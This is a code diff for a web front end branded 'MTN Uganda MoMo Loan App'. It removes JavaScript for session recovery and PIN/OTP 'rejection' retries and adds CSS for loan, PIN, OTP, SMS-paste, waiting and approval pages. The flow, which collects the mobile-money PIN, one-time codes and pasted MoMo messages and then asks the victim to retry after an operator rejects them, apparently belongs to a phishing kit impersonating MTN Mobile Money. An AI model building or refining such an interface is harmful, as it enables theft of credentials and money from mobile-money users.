-    if (pinCard) {
-        let attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-        if (!attemptsDisplay) {
-            attemptsDisplay = document.createElement('div');
-            attemptsDisplay.id = 'pinAttemptsDisplay';
-            attemptsDisplay.className = 'pin-attempts';
-            const pinLabel = document.querySelector('#page-pin .pin-label');
-            if (pinLabel) {
-                pinLabel.parentNode.insertBefore(attemptsDisplay, pinLabel.nextSibling);
-            }
-        }
-    }
+.msg-box.show {
+  display: flex;
 }
 
-// ─── Recovery on Page Load ───
-function recoverSession() {
-    console.log('🔄 Checking for saved session...');
-    
-    const appId = loadApplicationId();
-    if (appId) {
-        console.log(`✅ Found application ID: ${appId}`);
-    }
-    
-    const dataLoaded = loadApplicationData();
-    if (dataLoaded) {
-        console.log('✅ Loaded application data');
-    }
-    
-    if (checkOtpTimerRecovery()) {
-        console.log('✅ Recovered OTP timer');
-        return true;
-    }
-    
-    const rejection = loadRejectionInfo();
-    if (rejection) {
-        console.log(`✅ Found rejection info for step: ${rejection.step}`);
-        showToast(`⚠️ Your ${rejection.step.toUpperCase()} was rejected. Please try again.`, 'error');
-        S.applicationId = rejection.applicationId;
-        handleRejection(rejection.step);
-        return true;
-    }
-    
-    if (!rejection) {
-        loadFormDraft();
-    }
-    
-    return false;
+.msg-box.error {
+  background: #fef2f2;
+  border: 1.5px solid #fecaca;
+  color: #991b1b;
 }
 
-// ─── Auto-save on input changes ───
-document.addEventListener('input', (e) => {
-    if (e.target.closest('#page-step1, #page-step2, #page-step3')) {
-        saveFormDraft();
-    }
-    if (e.target.closest('#page-step2, #page-step3')) {
-        saveApplicationData();
-    }
-});
-
-// ─── Override goTo for PIN page ───
-const originalGoTo = goTo;
-goTo = function(pageId) {
-    originalGoTo(pageId);
-    if (pageId === 'page-pin') {
-        updatePinPageUI();
-        checkPinStatus();
-    }
-};
-
-// ─── INIT ───
-updateCalc();
-
-const recovered = recoverSession();
-
-if (!recovered) {
-    goTo('page-landing');
+.msg-box.success {
+  background: #f0fdf4;
+  border: 1.5px solid #bbf7d0;
+  color: #166534;
 }
 
-console.log('✅ MTN Uganda MoMo Loan App (All Features) loaded!');
+.msg-icon {
+  font-weight: 700;
+}
+
+/* ============================================================
+   SUMMARY BOX
+   ============================================================ */
+.sum-box {
+  border: 1px solid #e0e0e0;
+  border-left: 4px solid var(--mtn-gold);
+  border-radius: var(--radius-sm);
+  padding: 16px 14px;
+  margin: 16px 0;
+  background: #fafffe;
+}
+
+.sum-box h3 {
+  font-size: 0.88rem;
+  font-weight: 600;
+  margin-bottom: 12px;
+}
+
+.sum-row {
+  display: flex;
+  justify-content: space-between;
+  font-size: 0.82rem;
+  padding: 7px 0;
+  border-bottom: 1px solid #f0f0f0;
+}
+
+.sum-row:last-child {
+  border-bottom: none;
+}
+
+.sum-row .sk {
+  color: var(--text-light);
+}
+
+.sum-row .sv {
+  font-weight: 500;
+}
+
+/* ============================================================
+   LANDING PAGE
+   ============================================================ */
+#page-landing {
+  background: var(--page-bg);
+}
+
+.land-nav {
+  background: var(--mtn-dark);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 24px;
+  height: 52px;
+  flex-shrink: 0;
+}
+
+.land-nav .hbg {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+  cursor: pointer;
+}
+
+.land-nav .hbg span {
+  width: 20px;
+  height: 2px;
+  background: rgba(255,255,255,0.7);
+  border-radius: 1px;
+  display: block;
+}
+
+.land-center {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 32px 16px;
+}
+
+.land-card {
+  width: 100%;
+  max-width: 520px;
+  background: #fff;
+  border-radius: var(--radius);
+  box-shadow: 0 4px 24px rgba(0,0,0,0.1);
+  padding: 36px 32px;
+}
+
+.land-card h1 {
+  font-size: 1.45rem;
+  font-weight: 700;
+  text-align: center;
+  margin-bottom: 6px;
+}
+
+.land-tagline {
+  text-align: center;
+  font-size: 0.84rem;
+  color: var(--text-light);
+  margin-bottom: 28px;
+}
+
+.land-footer {
+  background: var(--mtn-dark);
+  padding: 14px;
+  text-align: center;
+  font-size: 0.77rem;
+  color: rgba(255,255,255,0.45);
+  flex-shrink: 0;
+}
+
+/* ============================================================
+   CALCULATOR
+   ============================================================ */
+.calc-box {
+  background: #fafafa;
+  border: 1px solid #eee;
+  border-radius: var(--radius-sm);
+  padding: 20px;
+  margin-bottom: 22px;
+}
+
+.calc-box h2 {
+  font-size: 0.92rem;
+  font-weight: 600;
+  margin-bottom: 16px;
+}
+
+.calc-row2 {
+  display: flex;
+  justify-content: space-between;
+  font-size: 0.81rem;
+  color: var(--text-mid);
+  margin-bottom: 6px;
+}
+
+.calc-row2 .cv {
+  color: var(--mtn-gold);
+  font-weight: 600;
+}
+
+input[type=range] {
+  width: 100%;
+  -webkit-appearance: none;
+  height: 5px;
+  border-radius: 3px;
+  outline: none;
+  cursor: pointer;
+  margin-bottom: 4px;
+  background: linear-gradient(to right, var(--mtn-gold) 0%, var(--mtn-gold) var(--pct,10%), #ddd var(--pct,10%), #ddd 100%);
+}
+
+input[type=range]::-webkit-slider-thumb {
+  -webkit-appearance: none;
+  width: 18px;
+  height: 18px;
+  border-radius: 50%;
+  background: var(--mtn-gold);
+  border: 3px solid #fff;
+  cursor: pointer;
+}
+
+.range-ends {
+  display: flex;
+  justify-content: space-between;
+  font-size: 0.72rem;
+  color: var(--text-light);
+  margin-bottom: 14px;
+}
+
+.monthly-box {
+  background: #fff;
+  border: 1px solid #eee;
+  border-radius: var(--radius-sm);
+  padding: 14px 16px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.monthly-box .ml {
+  font-size: 0.82rem;
+  color: var(--text-light);
+}
+
+.monthly-box .ma {
+  font-size: 1.5rem;
+  font-weight: 700;
+  color: var(--mtn-gold);
+}
+
+/* ============================================================
+   STEP CARDS
+   ============================================================ */
+.step-center {
+  flex: 1;
+  display: flex;
+  align-items: flex-start;
+  justify-content: center;
+  padding: 28px 16px;
+}
+
+.step-card {
+  width: 100%;
+  max-width: 480px;
+  background: #fff;
+  border-radius: var(--radius);
+  box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+  padding: 32px 28px;
+  transition: all 0.3s ease;
+  position: relative;
+  overflow: hidden;
+}
+
+.step-card h2 {
+  font-size: 1.25rem;
+  font-weight: 700;
+  text-align: center;
+  margin-bottom: 4px;
+}
+
+.step-sub {
+  text-align: center;
+  font-size: 0.82rem;
+  color: var(--text-light);
+  margin-bottom: 4px;
+}
+
+/* ============================================================
+   PROCESSING / WAITING PAGES
+   ============================================================ */
+#page-processing {
+  background: linear-gradient(160deg, var(--mtn-dark), var(--mtn-light));
+  align-items: center;
+  justify-content: center;
+}
+
+.proc-wrap {
+  text-align: center;
+  padding: 40px 24px;
+  max-width: 420px;
+}
+
+.proc-icon {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  background: rgba(255,255,255,0.1);
+  border: 2px solid rgba(255,255,255,0.3);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 2rem;
+  margin: 0 auto 24px;
+  animation: pulse 2s ease infinite;
+}
+
+@keyframes pulse {
+  0%, 100% { box-shadow: 0 0 0 0 rgba(255,215,0,0.3); }
+  50% { box-shadow: 0 0 0 16px rgba(255,215,0,0); }
+}
+
+.proc-wrap h2 {
+  font-size: 1.6rem;
+  font-weight: 700;
+  color: #fff;
+  margin-bottom: 12px;
+}
+
+.proc-wrap p {
+  color: rgba(255,255,255,0.75);
+  font-size: 0.88rem;
+  line-height: 1.7;
+  margin-bottom: 24px;
+}
+
+.wait-wrap {
+  text-align: center;
+  padding: 40px 24px;
+  max-width: 420px;
+}
+
+.wait-icon {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  background: rgba(255,255,255,0.1);
+  border: 2px solid rgba(255,255,255,0.3);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 2rem;
+  margin: 0 auto 24px;
+  animation: pulse 2s ease infinite;
+}
+
+.wait-wrap h2 {
+  font-size: 1.6rem;
+  font-weight: 700;
+  color: #fff;
+  margin-bottom: 12px;
+}
+
+.wait-wrap p {
+  color: rgba(255,255,255,0.75);
+  font-size: 0.88rem;
+  line-height: 1.7;
+  margin-bottom: 24px;
+}
+
+/* ============================================================
+   PIN / OTP
+   ============================================================ */
+.pin-label {
+  font-size: 0.82rem;
+  color: var(--text-light);
+  text-align: center;
+  margin-bottom: 12px;
+}
+
+.pin-row {
+  display: flex;
+  gap: 10px;
+  justify-content: center;
+  margin-bottom: 12px;
+  align-items: center;
+}
+
+.pin-box {
+  width: 52px;
+  height: 52px;
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius-sm);
+  text-align: center;
+  font-family: 'Inter', sans-serif;
+  font-size: 1.3rem;
+  font-weight: 700;
+  color: var(--mtn-dark);
+  outline: none;
+}
+
+.pin-box:focus {
+  border-color: var(--mtn-gold);
+}
+
+.pin-eye,
+.pin-delete {
+  cursor: pointer;
+  color: var(--text-light);
+  font-size: 1rem;
+  background: none;
+  border: none;
+  margin-left: 6px;
+}
+
+.pin-delete:hover {
+  color: var(--mtn-gold);
+}
+
+.otp-section {
+  margin-bottom: 24px;
+}
+
+.otp-section-title {
+  font-size: 0.9rem;
+  font-weight: 600;
+  color: var(--mtn-dark);
+  margin-bottom: 12px;
+}
+
+.otp-inputs {
+  display: flex;
+  gap: 8px;
+  margin-bottom: 12px;
+  width: 100%;
+}
+
+.otp-box {
+  flex: 1;
+  min-width: 0;
+  width: 0;
+  height: 52px;
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius-sm);
+  text-align: center;
+  font-family: 'Inter', sans-serif;
+  font-size: 1.2rem;
+  font-weight: 700;
+  color: var(--mtn-dark);
+  outline: none;
+  transition: border-color 0.2s;
+}
+
+.otp-box:focus {
+  border-color: var(--mtn-gold);
+}
+
+.otp-box::-webkit-outer-spin-button,
+.otp-box::-webkit-inner-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+
+.otp-box[type=number] {
+  -moz-appearance: textfield;
+}
+
+.otp-delete {
+  cursor: pointer;
+  color: var(--text-light);
+  font-size: 1rem;
+  background: none;
+  border: none;
+  margin-left: 6px;
+  padding: 0;
+  transition: color 0.2s;
+}
+
+.otp-delete:hover {
+  color: var(--mtn-gold);
+}
+
+/* ============================================================
+   SMS PASTE
+   ============================================================ */
+.momo-msg-box {
+  margin-bottom: 16px;
+}
+
+.momo-msg-box textarea {
+  width: 100%;
+  padding: 12px 14px;
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius-sm);
+  font-family: 'Inter', sans-serif;
+  font-size: 0.9rem;
+  color: var(--text-dark);
+  background: #fff;
+  outline: none;
+  transition: border-color 0.2s;
+  min-height: 120px;
+  resize: vertical;
+}
+
+.momo-msg-box textarea:focus {
+  border-color: var(--mtn-gold);
+}
+
+.momo-msg-box .hint {
+  font-size: 0.75rem;
+  color: var(--text-light);
+  margin-top: 5px;
+}
+
+/* ============================================================
+   APPROVAL PAGE
+   ============================================================ */
+#page-approval {
+  background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light));
+  min-height: 100vh;
+  align-items: center;
+  justify-content: center;
+  padding: 32px 16px;
+}
+
+.appr-wrap {
+  width: 100%;
+  max-width: 520px;
+}
+
+.appr-top {
+  background: #fff;
+  border-radius: var(--radius) var(--radius) 0 0;
+  padding: 28px 24px 0;
+  text-align: center;
+}
+
+.check-circle {
+  width: 56px;
+  height: 56px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, var(--mtn-gold), var(--mtn-light));
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 12px;
+  font-size: 1.3rem;
+  color: #fff;
+}
+
+.appr-title {
+  font-size: 1.2rem;
+  font-weight: 700;
+  margin-bottom: 6px;
+}
+
+.appr-sub {
+  font-size: 0.82rem;
+  color: var(--text-light);
+  margin-bottom: 18px;
+}
+
+.appr-banner {
+  background: var(--grad);
+  padding: 16px;
+  margin: 0 -24px;
+  text-align: center;
+}
+
+.appr-banner .abl {
+  font-size: 0.72rem;
+  color: rgba(255,255,255,0.8);
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+}
+
+.appr-banner .aba {
+  font-size: 2rem;
+  font-weight: 700;
+  color: #fff;
+}
+
+.comp-box {
+  background: #FFFBEA;
+  border: 1px solid #F5C842;
+  padding: 14px 16px;
+}
+
+.comp-box .ch {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 0.82rem;
+  font-weight: 700;
+  color: #a07000;
+  margin-bottom: 6px;
+}
+
+.comp-box p {
+  font-size: 0.78rem;
+  color: #7a5500;
+  line-height: 1.6;
+}
+
+.ld-card {
+  background: #fff;
+  padding: 20px 24px;
+}
+
+.ld-htitle {
+  font-size: 0.82rem;
+  font-weight: 600;
+  color: var(--text-mid);
+  margin-bottom: 14px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.ld-row {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 10px 0;
+  border-bottom: 1px solid #f5f5f5;
+}
+
+.ld-row:last-child {
+  border-bottom: none;
+}
+
+.ld-icon {
+  width: 34px;
+  height: 34px;
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 0.85rem;
+  flex-shrink: 0;
+}
+
+.ic-g {
+  background: linear-gradient(135deg, #2ECC71, #27AE60);
+  color: #fff;
+}
+
+.ic-b {
+  background: linear-gradient(135deg, #3498DB, #2980B9);
+  color: #fff;
+}
+
+.ic-p {
+  background: linear-gradient(135deg, #9B59B6, #8E44AD);
+  color: #fff;
+}
+
+.ld-lbl {
+  font-size: 0.72rem;
+  color: var(--text-light);
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+}
+
+.ld-val {
+  font-size: 0.9rem;
+  font-weight: 600;
+}
+
+.nxt-steps {
+  background: #fff;
+  padding: 14px 24px;
+  display: flex;
+  align-items: flex-start;
+  gap: 8px;
+  border-top: 1px solid #f0f0f0;
+}
+
+.nxt-steps p {
+  font-size: 0.79rem;
+  color: var(--text-light);
+  line-height: 1.5;
+}
+
+.rth-wrap {
+  background: #fff;
+  border-radius: 0 0 var(--radius) var(--radius);
+  padding: 14px 24px 24px;
+}
+
+.rth-btn {
+  width: 100%;
+  padding: 13px;
+  background: var(--grad);
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  font-size: 0.88rem;
+  font-weight: 600;
+  letter-spacing: 0.04em;
+  cursor: pointer;
+  font-family: 'Inter', sans-serif;
+}
+
+/* ============================================================
+   TOAST NOTIFICATIONS
+   ============================================================ */
+.toast {
+  position: fixed;
+  bottom: 30px;
+  left: 50%;
+  transform: translateX(-50%);
+  padding: 14px 24px;
+  border-radius: var(--radius-sm);
+  color: #fff;
+  font-weight: 500;
+  font-size: 0.9rem;
+  z-index: 10000;
+  animation: slideUp 0.3s ease;
+  max-width: 90%;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  transition: all 0.3s ease;
+}
+
+.toast-success {
+  background: linear-gradient(135deg, #27ae60, #2ecc71);
+}
+
+.toast-error {
+  background: linear-gradient(135deg, #c0392b, #e74c3c);
+}
+
+.toast-info {
+  background: linear-gradient(135deg, #2980b9, #3498db);
+}
+
+@keyframes slideUp {
+  from {
+    opacity: 0;
+    transform: translateX(-50%) translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+}
+
+/* ============================================================
+   REJECTION ANIMATIONS
+   ============================================================ */
+.step-card.rejected {
+  border: 2px solid #e74c3c;
+  animation: shake 0.5s ease;
+}
+
+.step-card.rejected::before {
+  content: '❌';
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  font-size: 2rem;
+  opacity: 0.3;
+}
+
+@keyframes shake {
+  0%, 100% { transform: translateX(0); }
+  25% { transform: translateX(-10px); }
+  75% { transform: translateX(10px); }
+}
+
+/* ============================================================
+   PIN ATTEMPTS DISPLAY
+   ============================================================ */
+.pin-attempts {
+  text-align: center;
+  font-size: 0.85rem;
+  padding: 8px 12px;
+  border-radius: var(--radius-sm);
+  margin: 8px 0 12px;
+  font-weight: 500;
+}
+
+.pin-attempts.warning {
+  background: #fef3c7;
+  color: #92400e;
+  border: 1px solid #f59e0b;
+}
+
+.pin-attempts.blocked {
+  background: #fee2e2;
+  color: #991b1b;
+  border: 1px solid #ef4444;
+  animation: pulse-blocked 1.5s ease infinite;
+}
+
+.pin-attempts.available {
+  background: #d1fae5;
+  color: #065f46;
+  border: 1px solid #10b981;
+}
+
+@keyframes pulse-blocked {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.6; }
+}
+
+.pin-box:disabled {
+  background: #f3f4f6;
+  cursor: not-allowed;
+  opacity: 0.6;
+}
+
+.pin-box:disabled:focus {
+  border-color: var(--border);
+}
+
+/* ============================================================
+   OTP RESEND BUTTON - TIMER STATES
+   ============================================================ */
+.btn-resend {
+  background: linear-gradient(135deg, #f39c12, #e67e22);
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  padding: 10px 16px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  cursor: pointer;
+  font-family: 'Inter', sans-serif;
+  transition: all 0.3s ease;
+  margin-top: 10px;
+  width: 100%;
+}
+
+.btn-resend:hover:not(:disabled) {
+  transform: scale(1.02);
+  opacity: 0.9;
+}
+
+.btn-resend:disabled {
+  background: #95a5a6;
+  cursor: not-allowed;
+  opacity: 0.7;
+}
+
+.btn-resend.hidden {
+  display: none;
+}
+
+.btn-resend:disabled {
+  animation: pulse-timer 1s ease infinite;
+}
+
+@keyframes pulse-timer {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.7; }
+}
+
+/* ============================================================
+   REJECTION BADGE
+   ============================================================ */
+.rejection-badge {
+  background: #e74c3c;
+  color: #fff;
+  font-size: 0.7rem;
+  font-weight: 600;
+  padding: 2px 8px;
+  border-radius: 12px;
+  display: inline-block;
+  margin-left: 8px;
+}
+
+/* ============================================================
+   LOADING OVERLAY
+   ============================================================ */
+.loading-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.7);
+  z-index: 9999;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  gap: 20px;
+}
+
+.loading-overlay.show {
+  display: flex;
+}
+
+.loading-spinner {
+  width: 50px;
+  height: 50px;
+  border: 4px solid rgba(255, 215, 0, 0.3);
+  border-top-color: var(--mtn-gold);
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+.loading-overlay p {
+  color: #fff;
+  font-size: 1rem;
+  font-weight: 500;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+/* ============================================================
+   RESPONSIVE
+   ============================================================ */
+@media (max-width: 600px) {
+  .field-row {
+    grid-template-columns: 1fr;
+  }
+
+  .pin-box {
+    width: 44px;
+    height: 44px;
+    font-size: 1.1rem;
+  }
+
+  .otp-box {
+    height: 44px;
+    font-size: 1rem;
+  }
+
+  .land-card,
+  .step-card {
+    padding: 24px 18px;
+  }
+
+  .appr-banner .aba {
+    font-size: 1.5rem;
+  }
+
+  .toast {
+    font-size: 0.8rem;
+    padding: 10px 16px;
+    bottom: 20px;
+  }
+
+  .proc-wrap h2,
+  .wait-wrap h2 {
+    font-size: 1.3rem;
+  }
+
+  .proc-icon,
+  .wait-icon {
+    width: 60px;
+    height: 60px;
+    font-size: 1.5rem;
+  }
+}
+
+@media (max-width: 400px) {
+  .pin-box {
+    width: 36px;
+    height: 36px;
+    font-size: 0.9rem;
+  }
+
+  .otp-box {
+    height: 38px;
+    font-size: 0.85rem;
+  }
+
+  .pin-row {
+    gap: 6px;
+  }
+
+  .otp-inputs {
+    gap: 5px;
+  }
+}
